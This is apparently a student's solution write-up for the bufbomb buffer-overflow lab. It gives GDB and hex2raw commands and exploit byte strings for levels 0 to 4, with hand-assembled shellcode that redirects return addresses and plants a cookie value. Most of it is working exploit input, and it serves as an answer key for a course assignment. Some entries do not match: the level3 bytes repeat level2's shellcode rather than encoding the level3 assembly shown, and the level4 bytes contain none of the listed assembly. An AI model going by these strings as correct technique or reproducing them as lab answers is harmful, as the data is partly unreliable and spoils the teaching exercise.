### GDB command prompt

```
    set disassemble-next-line on
    r -u lff < exploit-raw.txt
    x/12xw $rsp

    ./hex2raw < exploit.txt > exploit-raw.txt
    ./ctarget -i exploit-raw.txt
    ./bufbomb -u lff < exploit-raw.txt

    gcc -c example.s
    objdump -d example.o > example.d
```


### RUN command prompt
```
    cat exploit.txt | ./hex2raw | ./bufbomb -u lff
    ./hex2raw < exploit.txt > exploit-raw.txt
    ./bufbomb -u lff < exploit-raw.txt
    run -u lff < exploit-raw.txt
```
## Solution

### level0:
```
binary code:
    0x55683938:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683948:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683958:00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

### level1:
```
binary code:
    0x55683938:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683948:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683958:00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08      
    0x55683968:00 00 00 00 b0 6b 26 4e 00 00 00 00 00 00 00 00
    0x55683978:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

### level2:
```
# Example of hand-generated assembly code
    pushq $0x08048c9d
    movl $0x4e266bb0,0x804d100
    retq

0000000000000000 <.text>:
   0:	68 9d 8c 04 08       	pushq  $0x8048c9d
   5:	c7 04 25 00 d1 04 08 	movl   $0x4e266bb0,0x804d100
   c:	b0 6b 26 4e 
  10:	c3                   	retq   
```

```
binary code:
    0x55683938:68 9d 8c 04 08 c7 05 00 d1 04 08 b0 6b 26 4e c3
    0x55683948:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683958:00 00 00 00 00 00 00 00 00 00 00 00 38 39 68 55    
```

### level3:
```
# Example of hand-generated assembly code
    push $0x8048dbe
    mov $0x4e266bb0,%eax
    ret
```

```
binary code:
    0x55683938:68 9d 8c 04 08 c7 05 00 d1 04 08 b0 6b 26 4e c3
    0x55683948:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683958:00 00 00 00 00 00 00 00 90 39 68 55 38 39 68 55    
```

### level4:
```
# Example of hand-generated assembly code
    push $0x08048e26
    mov $0x4e266bb0,%eax
    ret

00000000 <.text>:
   0:	68 26 8e 04 08       	push   $0x8048e26
   5:	b8 b0 6b 26 4e       	mov    $0x4e266bb0,%eax
   a:	c3                   	ret    
```

```
binary code:
    0x55683938:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683948:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x55683958:00 00 00 00 00 00 00 00 00 00 00 00 26 8e 04 08   
```